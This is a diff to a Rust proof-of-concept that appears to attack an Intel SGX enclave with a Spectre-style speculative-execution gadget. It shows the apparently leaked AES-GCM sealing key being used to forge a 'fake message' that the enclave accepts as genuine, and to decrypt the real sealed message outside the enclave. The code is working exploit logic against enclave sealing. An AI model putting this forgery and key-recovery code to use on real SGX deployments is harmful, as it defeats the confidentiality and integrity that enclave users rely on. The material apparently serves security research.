@@ -352,7 +352,7 @@ fn main() -> std::io::Result<()> {
 
     let message = "Do Not Go Gentle Into That Good Night00000000000".as_bytes();
     let mut sealed_message = vec![0; 512];
-    let mut sealed_message_len = 0;
+    let mut sealed_message_len: u32 = 0;
     let mut out_tag = sgx_aes_gcm_128bit_tag_t::default();
 
     let mut status = sgx_status_t::SGX_SUCCESS;
@@ -373,14 +373,9 @@ fn main() -> std::io::Result<()> {
             format!("[-] ECALL Enclave Failed: {}!", result.as_str()),
         ));
     }
-    println!("{}", status);
+    println!("AES-GCM encryption: {}", status);
 
-    println!(
-        "input: {:?}\noutput: {:?} of size {} bytes\ntag: {:?}",
-        message, sealed_message, sealed_message_len, out_tag
-    );
-
-    println!("target: 0x{:x}", unsafe { TARGET });
+    println!("Our speculative target is: 0x{:x}", unsafe { TARGET });
 
     let spectre = Spectre::new(
         Some(spectre_test_training_fun),
@@ -414,14 +409,39 @@ fn main() -> std::io::Result<()> {
 
     let mut res_message = vec![0; 512];
 
+    let aad = &sealed_message[sealed_message_len as usize
+        - std::mem::size_of::<sgx_types::sgx_key_id_t>()
+        ..sealed_message_len as usize];
+
+    let nonce = GenericArray::from_slice(&[0; 12]);
+    let pkey = GenericArray::from(unsafe { std::mem::transmute::<u128, [u8; 16]>(pkey_val) });
+    let cipher = Aes128Gcm::new(&pkey);
+
+    println!("SEALING A FAKE MESSAGE");
+
+    let fake_message = b"fake message !!!";
+    let payload = Payload {
+        msg: fake_message,
+        aad,
+    };
+
+    let ciphertext = cipher.encrypt(nonce, payload).unwrap();
+    let mut tag: sgx_types::sgx_aes_gcm_128bit_tag_t =
+        sgx_types::sgx_aes_gcm_128bit_tag_t::default();
+    for i in 0..16 {
+        tag[i] = ciphertext[ciphertext.len() - 16 + i];
+    }
+    let mut ciphertext = ciphertext[..ciphertext.len() - 16].to_owned();
+    ciphertext.extend(aad);
+
     let result = unsafe {
         Enclave1_custom_unseal_data(
             ENCLAVE.geteid(),
             &mut status as *mut _,
-            sealed_message.as_ptr(),
-            sealed_message_len - std::mem::size_of::<sgx_types::sgx_key_id_t>() as u32,
+            ciphertext.as_ptr(),
+            fake_message.len() as u32,
             res_message.as_mut_ptr(),
-            &out_tag as *const _,
+            &tag as *const _,
         )
     };
     if result != sgx_status_t::SGX_SUCCESS {
@@ -430,23 +450,13 @@ fn main() -> std::io::Result<()> {
             format!("[-] ECALL Enclave Failed: {}!", result.as_str()),
         ));
     }
-    println!("{}", status);
+    println!("unsealing by enclave: {}", status);
 
-    println!("{}", unsafe { String::from_utf8_unchecked(res_message) });
+    println!("Deciphered by the enclave: {}", unsafe {
+        String::from_utf8_unchecked(res_message)
+    });
 
-    let nonce = GenericArray::from_slice(&[0; 12]);
-    let pkey = GenericArray::from(unsafe { std::mem::transmute::<u128, [u8; 16]>(pkey_val) });
-    let cipher = Aes128Gcm::new(&pkey);
-
-    let payload = Payload {
-        msg: b"fake message !!!",
-        aad: &sealed_message[sealed_message_len as usize
-            - std::mem::size_of::<sgx_types::sgx_key_id_t>()
-            ..sealed_message_len as usize],
-    };
-
-    let ciphertext = cipher.encrypt(nonce, payload).unwrap();
-    println!("{:?}", ciphertext);
+    println!("UNSEALING A MESSAGE");
 
     let mut sealed_message_owned = sealed_message
         [0..sealed_message_len as usize - std::mem::size_of::<sgx_types::sgx_key_id_t>()]
@@ -454,13 +464,13 @@ fn main() -> std::io::Result<()> {
     sealed_message_owned.extend(&out_tag[0..16]);
     let payload = Payload {
         msg: sealed_message_owned.as_slice(),
-        aad: &sealed_message[sealed_message_len as usize
-            - std::mem::size_of::<sgx_types::sgx_key_id_t>()
-            ..sealed_message_len as usize],
+        aad,
     };
     let deciphered = cipher.decrypt(nonce, payload).unwrap();
 
-    println!("{}", unsafe { String::from_utf8_unchecked(deciphered) });
+    println!("Deciphered by the app: {}", unsafe {
+        String::from_utf8_unchecked(deciphered)
+    });
 
     unsafe {
         std::mem::take(&mut ENCLAVE).destroy();
